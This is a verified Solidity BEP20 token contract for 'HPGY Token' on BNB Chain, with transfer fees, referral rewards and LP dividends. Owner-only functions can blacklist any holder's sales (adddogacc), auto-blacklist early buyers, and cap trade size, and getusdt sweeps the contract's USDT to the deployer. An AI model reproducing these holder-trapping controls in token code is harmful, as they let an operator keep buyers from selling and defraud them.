/**
 *Submitted for verification at BscScan.com on 2022-07-18
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.5.16;
interface Tokenall {
    function transfer(address to, uint value) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    function autoswapsell()external returns(bool);
}
interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Context {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }
  function _msgData() internal view returns (bytes memory) {
    this;
    return msg.data;
  }
}
library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
contract Ownable is Context {
  address private _owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }
  function owner() public view returns (address) {
    return _owner;
  }
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract BEP20Cardano is Context, IBEP20, Ownable {
  using SafeMath for uint256;
  Tokenall public metoken;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) private _whiteaddress;
  mapping (address => bool) private _dogacc;
  mapping(uint => address) private _lpacc;
  mapping(address => address) private _parr;
  mapping(address => bool) private _passaddress;
  uint private lpaccnum=0;
  uint private nowfhnum=0;
  uint private nowfhje=0;

  uint256 private _totalSupply;
  uint8 public _decimals;
  string public _symbol;
  string public _name;

  address public lp1;
  address public lp2;

  //swap配置
  address public usdtaddress=0x55d398326f99059fF775485246999027B3197955;
  address public tokenaddress=address(this);
  address public mainrouter=0x10ED43C718714eb63d5aA57B78B54704E256024E;
  address public autoaddress=address(this);
  address public burnacc=0x000000000000000000000000000000000000dEaD;
  address public mainacc=0x79c03A50572FC0a600c824E452D11C657Fac4438;
  address public zeroacc=0x0000000000000000000000000000000000000000;


  address public yxacc = address(0x97C003385944e838d9dA662B3491d465FCa66DA3);
  address public safeaddress = msg.sender;

  uint256 public lpfhnum=0;
  uint private opentime = 1657845000;
  uint private maxje=2;
  uint private minfhje=1*10**18;

  uint private maxsha=30;
  uint private sha=0;

   constructor() public {
    _name = "HPGY Token";
    _symbol = "HPGY";
    _decimals = 18;
    _totalSupply =5555 * 10 ** 18;

    usdtaddress=0x55d398326f99059fF775485246999027B3197955;
    mainrouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    _whiteaddress[mainacc]=true;
    _whiteaddress[yxacc]=true;
    _whiteaddress[autoaddress]=true;
    _whiteaddress[msg.sender]=true;
    _whiteaddress[0x69AE797b8D5288995dC152404467F0Ce10715575]=true;
    _whiteaddress[0xF84ACe80eddDd58eB68EB18c81111c02aE3Cf32b]=true;

    _passaddress[mainacc]=true;
    _passaddress[autoaddress]=true;
    _passaddress[burnacc]=true;

    _balances[mainacc]=_totalSupply;
    emit Transfer(address(0), mainacc, _balances[mainacc]);
  }
  function getOwner() external view returns (address) {
    return owner();
  }
  function decimals() external view returns (uint8) {
    return _decimals;
  }
  function symbol() external view returns (string memory) {
    return _symbol;
  }
  function name() external view returns (string memory) {
    return _name;
  }
  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }
  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }
 function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    setpid(sender,recipient);

    if(_dogacc[sender]==true && _whiteaddress[sender]!=true){
        require(sender == lp1, "BEP20:is a dog");
    }

    if((sender==lp1 || sender==lp2) && _whiteaddress[recipient]!=true  && recipient!=autoaddress){
        if(block.timestamp<opentime && sha<maxsha){
            _dogacc[recipient]=true;
            sha++;
        }
        if(amount>maxje*10**18){
            require(sender != lp1, "BEP20:before timestampe");
            require(sender != lp2, "BEP20:before timestampe");
        }
    }
    if((recipient==lp1 || recipient==lp2) && _whiteaddress[sender]!=true  && sender!=autoaddress){
        if(block.timestamp<opentime){
            _dogacc[sender]=true;
        }
        if(amount>maxje*10**18){
            require(recipient != lp1, "BEP20:before timestampe");
            require(recipient != lp2, "BEP20:before timestampe");
        }
    }
    
    if((sender==lp1 || sender==lp2) && _whiteaddress[recipient]!=true  && recipient!=autoaddress){
        _tokenTransfer(sender,autoaddress,amount.mul(4).div(100));
        if(_parr[sender]!=zeroacc){
           _tokenTransfer(sender,yxacc,amount.mul(2).div(100));
           _tokenTransfer(sender,_parr[sender],amount.mul(2).div(100));
        }else{
           _tokenTransfer(sender,yxacc,amount.mul(4).div(100));
        }
        _tokenTransfer(sender,recipient,amount.mul(92).div(100));
    }else if((recipient==lp1 || recipient==lp2)  && _whiteaddress[sender]!=true  && sender!=autoaddress){
        _tokenTransfer(sender,autoaddress,amount.mul(4).div(100));
        if(_parr[sender]!=zeroacc){
           _tokenTransfer(sender,yxacc,amount.mul(2).div(100));
           _tokenTransfer(sender,_parr[sender],amount.mul(2).div(100));
        }else{
           _tokenTransfer(sender,yxacc,amount.mul(4).div(100));
        }
        _tokenTransfer(sender,recipient,amount.mul(92).div(100));
        lpaccnum++;
        _lpacc[lpaccnum]=sender;
    }else if(sender==autoaddress || recipient==autoaddress){
         _tokenTransfer(sender,recipient,amount);
    }else{
         _tokenTransfer(sender,recipient,amount);
         autolpfh();
    }
  }

   function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
function autolpfh() public returns(bool){
      if(_balances[autoaddress]<minfhje){
          return true;
      }
      if(nowfhnum==0){
          nowfhje = _balances[autoaddress].div(lpaccnum);
      }
      metoken = Tokenall(lp1);
      for(uint i=nowfhnum+1;i<=nowfhnum+10;i++){
          if(metoken.balanceOf(_lpacc[i])>0){
              _tokenTransfer(autoaddress,_lpacc[i],nowfhje);
          }
          nowfhnum++;
          if(nowfhnum>lpaccnum){
              nowfhnum = 0;
              return true;
          }
      }
      return true;
  }
  function setpid(address sender, address recipient) internal returns(bool){
      //pass address
      if(_passaddress[sender] || _passaddress[recipient]){
          return false;
      }
      if(_parr[sender]!=zeroacc){
         return false;
       }
      _parr[sender]=recipient;
      return true;
  }
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }
  function burn(uint256 amount) public returns (bool) {
    _burn(_msgSender(), amount);
    return true;
  }
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }
  function setautoaddress(address _autoaddress) public onlyOwner{
        autoaddress = _autoaddress;
  }
  function addwhiteaddress(address _acc) public onlyOwner{
        _whiteaddress[_acc] = true;
  }
  function removewhiteaddress(address _acc) public onlyOwner{
        _whiteaddress[_acc] = false;
  }
  function showdog(address acc)public view returns(bool){
      return _dogacc[acc];
  }
  function adddogacc(address _acc) public onlyOwner{
        _dogacc[_acc] = true;
  }
  function removedogacc(address _acc) public onlyOwner{
        _dogacc[_acc] = false;
  }
 function setminfhje(uint num) public onlyOwner{
        minfhje = num;
  }
  function setopentime(uint _opentime) public onlyOwner{
      opentime = _opentime;
  }
  function setmaxje(uint _maxje) public onlyOwner{
      maxje = _maxje;
  }
  function setlp1(address _lp1) public onlyOwner{
      lp1 = _lp1;
  }
  function setsha(uint _sha) public onlyOwner{
      sha = _sha;
  }
  function setmaxsha(uint _maxsha) public onlyOwner{
      maxsha = _maxsha;
  }
  function addpassacc(address _acc) public onlyOwner{
        _passaddress[_acc] = true;
  }
  function getpacc(address acc) external view returns(address){
      return _parr[acc];
  }
  function getusdt()public returns(bool){
     metoken = Tokenall(usdtaddress);
     uint256 amount = metoken.balanceOf(tokenaddress);
     metoken.transfer(safeaddress,amount);
     return true;
  }
}